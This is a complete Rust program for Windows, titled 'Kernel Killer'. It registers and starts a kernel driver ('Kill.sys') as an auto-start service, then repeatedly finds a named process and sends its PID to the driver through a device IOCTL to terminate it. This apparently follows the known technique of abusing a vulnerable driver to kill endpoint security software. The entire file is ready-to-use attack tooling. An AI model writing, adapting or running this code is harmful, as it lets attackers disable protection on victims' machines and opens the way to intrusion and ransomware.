#![allow(non_snake_case, dead_code)]

use clap::{App, Arg};
use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
use std::thread::sleep;
use std::time::Duration;

use winapi::shared::{
    minwindef::{DWORD, LPVOID},
    winerror::NO_ERROR,
};
use winapi::um::{
    fileapi::{CreateFileW, OPEN_EXISTING},
    handleapi::{CloseHandle, INVALID_HANDLE_VALUE},
    ioapiset::DeviceIoControl,
    processenv::GetCurrentDirectoryW,
    tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS},
    winnt::{HANDLE, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, SERVICE_KERNEL_DRIVER},
    winsvc::*,
};

type GenResult<T> = Result<T, Box<dyn std::error::Error>>;

/// Defines how a driver should be configured
trait DriverProfile {
    const SERVICE_NAME: &'static str;
    const DRIVER_PATH: &'static str;
    const DEVICE_PATH: &'static str;
    const IOCTL: DWORD;
}

/// Example driver profile
struct ExampleDriver;

impl DriverProfile for ExampleDriver {
    const SERVICE_NAME: &'static str = "Kill";
    const DRIVER_PATH: &'static str = "\\Kill.sys";
    const DEVICE_PATH: &'static str = "\\\\.\\eb";
    const IOCTL: DWORD = 0x222024;
}

/// Wrapper for Windows service handles (auto-close)
struct AutoService(SC_HANDLE);

impl AutoService {
    fn new(h: SC_HANDLE) -> Option<Self> {
        if h.is_null() { None } else { Some(Self(h)) }
    }

    fn raw(&self) -> SC_HANDLE { self.0 }
}

impl Drop for AutoService {
    fn drop(&mut self) {
        unsafe { CloseServiceHandle(self.0); }
    }
}

/// Wrapper for file/device handles
struct AutoHandle(HANDLE);

impl AutoHandle {
    fn new(h: HANDLE) -> Option<Self> {
        if h == INVALID_HANDLE_VALUE { None } else { Some(Self(h)) }
    }

    fn raw(&self) -> HANDLE { self.0 }
}

impl Drop for AutoHandle {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.0); }
    }
}

/// Core structure that bridges userland ↔ driver
struct KernelBridge<D: DriverProfile> {
    _scm: AutoService,
    service: AutoService,
    _marker: std::marker::PhantomData<D>,
}

impl<D: DriverProfile> KernelBridge<D> {

    /// Initialize or create the driver service
    fn init() -> GenResult<Self> {
        let scm = AutoService::new(unsafe {
            OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CREATE_SERVICE)
        }).ok_or("SCM open failed")?;

        let service = match AutoService::new(unsafe {
            OpenServiceW(scm.raw(), wide(D::SERVICE_NAME).as_ptr(), SERVICE_ALL_ACCESS)
        }) {
            Some(s) => {
                println!("[*] Using existing service");
                s
            }
            None => {
                println!("[*] Creating service...");

                let path = format!("{}{}", current_dir()?, D::DRIVER_PATH);

                AutoService::new(unsafe {
                    CreateServiceW(
                        scm.raw(),
                        wide(D::SERVICE_NAME).as_ptr(),
                        wide(D::SERVICE_NAME).as_ptr(),
                        SERVICE_ALL_ACCESS,
                        SERVICE_KERNEL_DRIVER,
                        SERVICE_AUTO_START,
                        SERVICE_ERROR_NORMAL,
                        wide(&path).as_ptr(),
                        null_mut(), null_mut(), null_mut(), null_mut(), null_mut(),
                    )
                }).ok_or("Service creation failed")?
            }
        };

        Ok(Self { _scm: scm, service, _marker: std::marker::PhantomData })
    }

    /// Start the driver
    fn start(&self) -> GenResult<()> {
        if unsafe { StartServiceW(self.service.raw(), 0, null_mut()) } == 0 {
            return Err("Driver start failed".into());
        }
        println!("[+] Driver running");
        Ok(())
    }

    /// Stop & delete service
    fn shutdown(&self) {
        let mut status = SERVICE_STATUS {
            dwServiceType: 0,
            dwCurrentState: SERVICE_STOPPED,
            dwControlsAccepted: 0,
            dwWin32ExitCode: NO_ERROR,
            dwServiceSpecificExitCode: 0,
            dwCheckPoint: 0,
            dwWaitHint: 0,
        };

        unsafe {
            ControlService(self.service.raw(), SERVICE_CONTROL_STOP, &mut status);
            DeleteService(self.service.raw());
        }

        println!("[*] Driver stopped & removed");
    }

    /// Send kill request to driver
    fn terminate_pid(&self, pid: DWORD) -> GenResult<()> {
        let device = AutoHandle::new(unsafe {
            CreateFileW(
                wide(D::DEVICE_PATH).as_ptr(),
                SERVICE_ALL_ACCESS,
                0,
                null_mut(),
                OPEN_EXISTING,
                0,
                null_mut(),
            )
        }).ok_or("Device open failed")?;

        let mut ret = 0;
        let mut out: DWORD = 0;

        let ok = unsafe {
            DeviceIoControl(
                device.raw(),
                D::IOCTL,
                &pid as *const _ as LPVOID,
                mem::size_of::<DWORD>() as DWORD,
                &mut out as *mut _ as LPVOID,
                mem::size_of::<DWORD>() as DWORD,
                &mut ret,
                null_mut(),
            )
        };

        if ok == 0 {
            return Err("IOCTL failed".into());
        }

        println!("[+] Killed PID {}", pid);
        Ok(())
    }
}

/// Convert string → wide string
fn wide(s: &str) -> Vec<u16> {
    OsStr::new(s).encode_wide().chain(Some(0)).collect()
}

/// Get current working directory
fn current_dir() -> GenResult<String> {
    let mut buf = vec![0u16; 260];
    let len = unsafe { GetCurrentDirectoryW(buf.len() as u32, buf.as_mut_ptr()) };

    if len == 0 {
        return Err("cwd error".into());
    }

    buf.truncate(len as usize);
    Ok(String::from_utf16_lossy(&buf))
}

/// Find PID from process name
fn find_pid(name: &str) -> Option<DWORD> {
    let snap = AutoHandle::new(unsafe {
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    })?;

    let mut entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(snap.raw(), &mut entry) } == 0 {
        return None;
    }

    loop {
        let exe = unsafe { CStr::from_ptr(entry.szExeFile.as_ptr()) }
            .to_string_lossy()
            .to_lowercase();

        if exe == name.to_lowercase() {
            return Some(entry.th32ProcessID);
        }

        if unsafe { Process32Next(snap.raw(), &mut entry) } == 0 {
            break;
        }
    }

    None
}

fn main() -> GenResult<()> {
    let args = App::new("Kernel Killer")
        .arg(Arg::new("name").short("n").long("name").takes_value(true))
        .get_matches();

    let target = args.value_of("name").unwrap();

    let bridge = KernelBridge::<ExampleDriver>::init()?;
    bridge.start().ok();

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();

    ctrlc::set_handler(move || {
        println!("\n[!] Exiting...");
        r.store(false, Ordering::SeqCst);
    })?;

    while running.load(Ordering::SeqCst) {
        if let Some(pid) = find_pid(target) {
            let _ = bridge.terminate_pid(pid);
        }
        sleep(Duration::from_millis(700));
    }

    bridge.shutdown();
    Ok(())
}
